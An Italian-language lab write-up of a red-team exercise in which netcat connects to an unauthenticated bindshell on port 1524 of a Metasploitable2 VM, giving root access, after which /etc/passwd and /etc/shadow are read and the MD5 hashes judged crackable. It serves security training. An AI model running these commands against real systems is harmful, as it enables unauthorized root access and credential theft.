# 01 — Exploitation: Bindshell Porta 1524

## Categoria
Red Team / Exploitation / Backdoor Access

## Obiettivo
Accedere al sistema target sfruttando una backdoor (bindshell)
in ascolto sulla porta 1524 senza autenticazione.

## Ambiente

| Ruolo | VM | IP |
|---|---|---|
| Attacker | Kali Linux | 10.10.10.100 |
| Target | Metasploitable2 | 10.10.10.101 |

## Tool
**Netcat (nc)** — utility per connessioni TCP/UDP raw, preinstallata su Kali.

## Procedura

```bash
nc 10.10.10.101 1524
```

Un solo comando. Nessuna password. Accesso immediato come root.

## Esecuzione — Output Completo

### Accesso Root e Ricognizione Iniziale
```bash
nc 10.10.10.101 1524
whoami      # root
uname -a    # Linux metasploitable 2.6.24-16-server i686
pwd         # /
ls /home/   # ftp  msfadmin  service  user
```

![Root shell - whoami e uname](screenshots/meta-05-bindshell-root-whoami-uname.png)

### Utenti del Sistema — /etc/passwd
```bash
cat /etc/passwd
```
Utenti con shell interattiva (`/bin/bash`):
- `root` (uid 0)
- `msfadmin` (uid 1000)
- `user` (uid 1001)
- `service` (uid 1002)

![/etc/passwd](screenshots/meta-06-etc-passwd.png)

### Hash Password — /etc/shadow
```bash
cat /etc/shadow
```

![/etc/shadow](screenshots/meta-07-etc-shadow.png)

| Utente | Prefisso Hash | Algoritmo |
|---|---|---|
| root | `$1$` | MD5 — obsoleto |
| msfadmin | `$1$` | MD5 — obsoleto |
| user | `$1$` | MD5 — obsoleto |

## Spiegazione Tecnica

Un **bindshell** è un processo che ascolta su una porta e,
a ogni connessione, avvia una shell collegata al socket.
Chiunque raggiunga la porta ottiene accesso diretto.

In un contesto reale questa configurazione esiste quando:
- Un malware installa una backdoor
- Un amministratore lascia una porta di debug aperta
- Una misconfiguration espone un servizio interno

## Risultato
- Accesso root ottenuto ✅
- /etc/passwd letto ✅
- /etc/shadow estratto (hash MD5 crackabili) ✅

## Snapshot
`02-kali-prima-exploitation-bindshell`

## Lezioni Imparate
- La ricognizione nmap ha rivelato la porta — senza enumeration
  non avremmo saputo dove colpire
- Non tutti gli exploit richiedono tool complessi
- MD5-crypt (`$1$`) è crackabile in pochi minuti con GPU moderna